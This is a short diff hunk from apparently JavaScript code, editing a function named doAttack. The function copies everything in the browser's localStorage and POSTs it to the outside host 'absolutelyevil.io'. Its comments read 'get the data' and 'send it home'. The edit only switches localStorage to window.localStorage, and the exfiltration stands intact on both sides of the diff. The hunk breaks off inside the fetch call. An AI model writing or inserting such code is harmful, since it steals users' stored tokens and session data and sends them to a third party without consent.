@@ -11,7 +11,7 @@ doAttack()
 async function doAttack() {
   try {
     // get the data
-    const data = Object.assign({}, localStorage)
+    const data = Object.assign({}, window.localStorage)
     // send it home
     await window.fetch('https://absolutelyevil.io', {
       method: 'post',
